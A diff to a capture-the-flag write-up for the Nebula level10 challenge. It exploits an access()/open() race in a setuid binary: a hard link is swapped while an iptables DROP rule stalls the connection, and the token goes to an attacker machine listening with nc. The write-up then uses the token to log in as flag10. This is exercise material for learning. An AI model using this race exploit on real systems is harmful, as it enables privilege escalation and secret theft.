@@ -121,7 +121,7 @@ RETURN VALUE
 ```
 There's going to be a problem here, `flag10` checks for `R_OK` read access but `access` checks against the `real UID`.
 
-`setuid` sets the `effective UID`, thus we will fail the check when entering `token` as the file.
+`setuid` sets the `effective UID`, thus we will fail the check when entering `token` as the `file`.
 
 But the `man` article has more to say:
 ```
@@ -133,8 +133,80 @@ NOTES
 ```
 Jackpot?
 
-We can make `file` a `symbolic link` and change the link accordingly:
+We can make `file` a `hard link` and change it accordingly:
 * `access()` - point to a file created by `level10`
 * `open()` - point to `token`
 
-Since we initiate the connection to `host` after calling `access()` we can
+Since we initiate the connection to `host` after calling `access()` we can stall the process to buy us time for swapping our link file.
+
+For this I am going to use a second machine to act as the receiving end of the `token`.
+
+### The Plan
+Create dummy file with `level10` permissions.
+```console
+level10@nebula:~$ echo hello > /home/level10/test
+```
+Create link file and link it to dummy file.
+```console
+level10@nebula:~$ ln -fT /home/level10/test /home/level10/tkn
+```
+Listen for incoming connection on attacker machine at predefined port `18211`.
+```console
+┌──(kali㉿kali)-[~]
+└─$ nc -lvp 18211
+listening on [any] 18211 ...
+```
+Create `iptables` rule to drop connections from victim machine.
+
+Notice the usage of `DROP` in contrast to `REJECT`.
+* `REJECT` - replies with `RST`, rejects the connection
+* `DROP` - drops the packets with no reply
+
+We want `DROP` because we need to stall the connection phase.
+
+This will force the victim machine to retransmit the `SYN` packet and wait till `timeout`.
+```console
+┌──(root💀kali)-[/home/kali]
+└─# iptables -A INPUT -s 192.168.157.3 -j DROP
+```
+Run `flag10` with link as `file` and attacker machine as `host`.
+```console
+level10@nebula:/home/flag10$ ./flag10 /home/level10/tkn 192.168.157.4
+Connecting to 192.168.157.4:18211 .. 
+```
+While the victim machine tries connecting, we know we passed the `access()` test.
+
+So we can swap the link
+```console
+level10@nebula:~$ ln -fT /home/flag10/token tkn
+```
+and remove the `iptables` rule.
+```console
+┌──(root💀kali)-[/home/kali]
+└─# iptables -L INPUT
+Chain INPUT (policy ACCEPT)
+target     prot opt source               destination
+DROP       all  --  192.168.157.3        anywhere
+
+┌──(root💀kali)-[/home/kali]
+└─# iptables -D INPUT 1
+```
+After the connection is made, `open()` is called with `token` as the file our link points to.
+```console
+...
+Connected!
+Sending file .. wrote file!
+```
+```console
+192.168.157.3: inverse host lookup failed: Host name lookup failure
+connect to [192.168.157.4] from (UNKNOWN) [192.168.157.3] 37391
+.oO Oo.
+615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+```
+Use the `token` to login as `flag10` and `getflag`!
+```console
+level10@nebula:/home/flag10$ su flag10
+Password:
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
+```
